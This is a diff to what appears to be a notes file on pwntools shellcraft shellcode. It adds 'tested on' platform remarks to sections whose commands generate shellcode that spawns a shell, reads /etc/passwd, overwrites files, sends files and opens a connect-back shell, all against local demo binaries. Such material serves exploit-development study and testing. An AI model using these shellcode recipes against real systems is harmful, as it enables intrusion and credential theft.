@@ -10,16 +10,22 @@ nw    = 'connectback'
 
 
 ### sh 
+* tested on i386, amd64
+
 ``shellcraft -c i386 sh -f r | strace -ifx demo32 -``
 
 ### dupsh
+* tested on i386, amd64
+
 ``shellcraft -c i386 dupsh 1 -f r | strace -ifx demo32 -``
 
 ### cat
+* tested on i386, amd64
+
 ``shellcraft -c i386 cat /etc/passwd  -f r | strace -ifx demo32 -``
 
-
 ### write_file = open_file + write_file 
+* tested on i386, amd64
 
 ```python
 s = 'this file has been overwritted by me'
@@ -30,6 +36,9 @@ sc += asm(shellcode.write_file(3, s, len(s)))
 ```
 
 ### ls
+* tested on i386
+* have to write shellcode in amd64
+
 ``shellcraft -c i386 ls /etc -f r | demo32 -``
 
 ```python
@@ -45,6 +54,8 @@ while 1:
 ```
 
 ### sendfile = open_file + sendfile
+* tested on i386, amd64 
+
 ```python
 #!python
 
@@ -65,4 +76,6 @@ print s.recvall()
 ```
 
 ### connectback
+* tested on i386, amd64(unstable)
+
 ``shellcraft -c i386 connectback localhost 31338 3 -f r | nc localhost 31337``
